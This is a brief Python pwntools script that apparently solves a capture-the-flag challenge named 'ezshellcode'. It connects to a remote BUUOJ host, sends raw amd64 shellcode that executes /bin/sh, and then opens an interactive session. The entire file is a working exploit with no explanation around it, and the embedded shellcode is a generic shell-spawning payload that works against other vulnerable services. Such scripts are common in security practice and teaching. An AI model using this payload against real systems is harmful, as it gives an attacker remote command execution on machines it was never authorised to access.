from pwn import *

# p = process('./ezshellcode')
p = remote('node4.buuoj.cn', '26446')
context(log_level='debug', arch='amd64', os='linux')

p.recvuntil('magic')
sc = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
p.send(sc)
p.interactive()
